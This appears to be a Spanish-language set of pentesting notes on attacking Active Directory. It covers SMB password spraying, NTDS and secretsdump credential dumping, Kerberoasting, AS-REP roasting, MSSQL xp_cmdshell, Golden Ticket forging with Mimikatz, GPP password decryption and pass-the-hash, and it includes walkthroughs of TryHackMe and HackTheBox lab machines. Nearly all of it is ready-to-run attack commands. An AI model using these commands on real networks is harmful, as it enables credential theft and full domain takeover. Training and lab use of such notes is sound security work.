# Active Directory Parte 2

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Que nos encontramos en ese segmento de red.

```
crackmapexec smb IP # o poner segmento 192.168.4.128-132
```

Si no pide firma podemos hacer NTL relay. En el dominio principal por defecto está firmado.

Realizar escaneo de NMAP completo.

* Puerto 53: DNS
* Puerto 88: Kerberos
* Puerto 389: LDAP
* Puerto 445: SMB

Escaneo NMAP para ver el dominio.

```
nmap -n -P0 -p 53,88,389,445 --script smb-os-discovery.nse IP 
```

## Reconocimiento

Nos creamos un listado de usuarios con los que nos salen.

```
crackmapexec smb IP(AD) -u usuarios.txt -p diccionario.txt --continue-on-success
```

Para cuando sea solo a un ordenador y no al dominio principal.

```
crackmapexec smb IP -u usuarios.txt -p diccionario.txt --local-auth
```

Si pone **Pwned!** es que tiene altos privilegios.

```
crackmapexec smb IP -u usuario -p '1234' --continue-on-success
crackmapexec smb IP -u usuario -p '1234' --pass-pol #política de contraseñas
crackmapexec smb IP -u usuario -p '1234' --users
```

Dumpear la base de datos del dominio.

```
crackmapexec smb IP(AD) -u usuario -p '1234' --ntds
```

La estructura de la respuesta es -> Usuario:ID:LM HASH:NTHASH

Si pone **404ee** en el LM está deshabilitado.

Rompemos las contraseñas creando un diccionario con NTHASH.

{% embed url="https://hashes.com/en/decrypt/hash" %}

Contraseñas previas que se han configurado.

```
impacket-secretsdump -just-dc usuario:password@IP -history -pwd-last-secret
```

No se necesita ser administrador de dominio para realizar un ataque de **Keberoasting**.

```
impacket-GetUserSPNs -dc-ip IP(AD) dominio.com/usuario:'1234' -request
```

Cogemos la contraseña para crackear.

```
hashcat -m 13100(número depende) --force -a 0 hash diccionario.txt
john --format=krb5tgs --wordlist=diccionario.txt hash
```

Lo probamos.

```
crackmapexec smb IP(AD) -u SVC_SQLService -p '1234'
```

## **AS -REP Roasting Attack**

Solo requiere listado de usuarios.

```
impacket-GetNPUsers -dc-ip IP(AD) dominio.com/ -no-pass -userfile users.txt -outfile salida.txt
```

Para crackear la contraseña.

```
hashcat --help | grep AS_REP --> 18200
```

Para ver si corre base de datos

```
nmap -n -P0 -p 1433 -sV --open -vv IP(AD)
```

Obtener credenciales.

```
crackmapexec mssql IP(AD) -u usuarios.txt -p diccionario.txt --local-auth --continue-on-success
```

```
msfconsole -q
use auxiliary/admin/mssql/mssql_sql
set RHOST IP(AD)
set PASSWORD
set SQL select password.hash from sys.sql_logins

#caracteristicas de la base de datos
use auxiliary/admin/mssql/mssql_enum
```

## MSSQL--> Content Header:Salt:Hash

Para romper hashes de contraseñas de SQL Server, puedes usar herramientas como `hashcat` o `john`:

```bash
# Con hashcat (modo 1731 para MSSQL 2012+)
hashcat -m 1731 --force -a 0 hash.mssql diccionario.txt

# Con John the Ripper
john --format=mssql12 --wordlist=diccionario.txt hash.mssql
```

> **Nota:** El modo 1731 corresponde a hashes de SQL Server 2012 en adelante (`mssql12` en John).

El procedimiento extendido `xp_cmdshell` permite ejecutar comandos del sistema operativo directamente desde SQL Server. Esto puede facilitar la escalada de privilegios o la persistencia.

```sql
-- Permite ejecutar comandos del sistema desde MSSQL
EXEC xp_cmdshell 'whoami';
```

Para automatizar esto con Metasploit:

```bash
use auxiliary/admin/mssql/mssql_exec
```

> **Precaución:** `xp_cmdshell` suele estar deshabilitado por defecto. Se requiere acceso privilegiado para activarlo.

## Golden Ticket

El ataque de Golden Ticket es una técnica avanzada que explota el funcionamiento interno del protocolo Kerberos en entornos de Active Directory. En esencia, este ataque permite a un atacante generar tickets de autenticación válidos sin necesidad de pasar por el proceso normal de autenticación del dominio. Esto se logra obteniendo el hash de la cuenta `krbtgt`, una cuenta especial utilizada por el controlador de dominio para firmar los Ticket Granting Tickets (TGTs). Una vez que el atacante tiene este hash, puede usar herramientas como Mimikatz para generar un TGT falso —el llamado "Golden Ticket"— que puede incluir cualquier identidad y privilegios deseados, incluso acceso como administrador del dominio.

Este ticket falsificado puede inyectarse en una sesión activa (por ejemplo, en una máquina como WIN10-PC2), y a partir de ahí, el atacante puede autenticarse ante el controlador de dominio como si fuera un usuario legítimo. Esto le permite acceder a otros recursos del dominio, como servidores de archivos (ej. FILESERVER), estaciones de trabajo, o incluso a los propios controladores de dominio, sin necesidad de credenciales reales. Además, como el atacante puede establecer el tiempo de validez del ticket, este acceso puede mantenerse durante largos periodos sin ser detectado.

El ataque Golden Ticket es particularmente grave porque incluso si las contraseñas de los usuarios comprometidos se cambian, el acceso persistente se mantiene hasta que el hash de `krbtgt` sea rotado dos veces, lo cual es un proceso sensible y que requiere cuidado. Por esto, es considerado una técnica de post-explotación crítica y de alta peligrosidad en escenarios de compromiso total del dominio.

<figure><img src="../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>

El "Golden Ticket" permite crear tickets TGT falsificados usando la clave de servicio de `krbtgt`, lo que otorga acceso completo al dominio.

Para esto necesitas:

* El hash de la cuenta `krbtgt`
* El nombre del dominio
* El SID del dominio

Ejemplo con `impacket-psexec`:

```bash
impacket-psexec enterprise.com/Administrator:'Password'@IP(AD)
```

> Este acceso es útil para moverse lateralmente dentro del dominio una vez generado un TGT válido.

## Mimikatz.exe

Con Mimikatz puedes extraer y manipular secretos del sistema, como el hash de la cuenta `krbtgt` necesario para generar Golden Tickets:

```bash
lsadump::lsa /inject /name:krbtgt
```

> Este comando requiere privilegios de SYSTEM. Una vez obtenido el hash, puede utilizarse para falsificar tickets TGT con herramientas como `ticketer.py` de Impacket.

Obtenemos el ID y NTLM y creamos el ticket.

```
kerberos::golden /domain:enterprise.com /sid:ID /rc4:NTLM /user:Administrator /ticket:ticket
```

## Active directory basics (THM)

Accedemos.

```
xfreerdp /u:Administrator /p:Password321 /v:10.10.224.147:3389
```

Enumerar recursos compartidos.

```
smbmap -H 10.10.224.147 -u 'Administrator' -p 'Password321' 
```

Enumerar recursos compartidos.

```
netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --shares
```

Enumerar usuarios y servidores.

```
netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --rid-brute
```

Cambiamos contraseña de sophie.

```
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')
```

También se puede cambiar de esta manera.

```
bloodyAD --host '10.10.224.147' -u 'philip' -p 'Claire2008' set password sophie 'Bea123'
```

Entrar en Group Policy Management.

<figure><img src="../.gitbook/assets/image (1639).png" alt=""><figcaption></figcaption></figure>

## Kerberoasting

Windows solía permitir almacenar contraseñas en texto cifrado (pero fácilmente descifrable) en archivos XML dentro de políticas de grupo (GPP) en controladores de dominio. Aunque esta práctica fue desaconsejada desde hace tiempo, aún se encuentran entornos vulnerables.

Utiliza la herramienta `smbmap` para conectarse al recurso compartido SMB del host con IP 10.10.10.100. A través del argumento `--download` se solicita la descarga del archivo `Groups.xml` ubicado en el directorio `Policies`, específicamente dentro de la ruta correspondiente a una política de grupo activa. Este archivo es relevante porque dentro de los controladores de dominio, las GPO pueden contener credenciales administrativas mal configuradas, particularmente dentro del directorio SYSVOL, el cual suele estar accesible para cualquier usuario del dominio, lo que representa una seria vulnerabilidad si se almacenan contraseñas en él.

```
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Mostrar el contenido completo del archivo XML descargado.

```
cat 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

Desciframos.

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ'
```

Si tenemos un usuario con su contraseña dentro de un dominio vemos si es vulnerable. Antes de eso sincronizamos.

```
ntpdate 10.10.10.100 (IP máquina víctima)
```

Intento obtener el Ticket Granting Service.

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Crackeamos.

```
john --wordlist=rockyou.txt hash.txt
```

Teniendo la contraseña deshasheada.

```
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Ahora conseguir una shell.

```
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
```

## Kerbrute

{% @github-files/github-code-block url="https://github.com/ropnop/kerbrute" %}

Poner `/etc/hosts`.

```
IP nombre_dominio nombre_PC nombre_PC.nombre_dominio
```

Al instalar le damos permisos de ejecución. Vemos usuarios posibles.

```
./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.71 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Hacemos password-spraying.

```
./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Ahora fuerza bruta de contraseñas.

```
./kerbrute_linux_amd64 bruteuser -d cicada.htb --dc 10.10.11.35 pass.txt emily.oscars
```

## Attacktive directory (THM)

Información de qué nos estamos enfrentando.

```
crackmapexec smb IP
```

```
enum4linux -a 10.10.161.237
```

Usamos kerbrute.

{% @github-files/github-code-block url="https://github.com/TarlogicSecurity/kerbrute" %}

```
python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100
```

Hemos encontrado un ususario. Pedimos al Domain Controller el Ticket.

```
impacket-GetNPUsers spookysec.local/svc-admin -no-pass
```

Crackeamos el hash.

```
john --wordlist=/rockyou.txt hash
```

Comprobamos que ese usuario tiene esa contraseña.

```
crackmapexec smb IP -u 'svc-admin' -p 'Contraseña'
```

Teniendo estas credenciales, miramos recursos compartidos.

```
smbclient -L spooky.local --user 'svc-admin' --password 'contraseña'
```

Entramos dentro de los recursos compartidos.

```
smbclient \\\\spooky.local\\backup --user svc-admin --password management2005
```

Descargamos el archivo y decodificamos contraseña. Podemos dumpear la contraseña con **impacket**.

```
impacket-secretsdump -just-dc backup@spookysec.local
```

Con su contraseña podemos dumpear y vemos bastantes credenciales.

Ahora lanzamos un ataque **Pass-The-Hash** pasándole el hash de admin ya podemos ejecución remota de comandos.

```
impacket-psexec Administrator:@spookysec.local -hashes hash
```
